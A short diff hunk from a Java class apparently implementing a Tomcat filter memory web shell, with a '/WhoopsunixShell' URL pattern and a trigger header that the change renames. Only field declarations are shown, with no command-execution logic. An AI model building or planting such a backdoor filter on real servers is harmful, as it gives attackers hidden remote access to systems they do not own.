@@ -15,7 +15,7 @@ import java.lang.reflect.Field;
 public class TomcatFilterThreadMS implements Filter {
     private static String NAME = "Whoopsunix";
     private static String pattern = "/WhoopsunixShell";
-    private static String header = "X-Token";
+    private static String header = "Xoken";
     private static HttpServletRequest request;
     private static HttpServletResponse response;
 
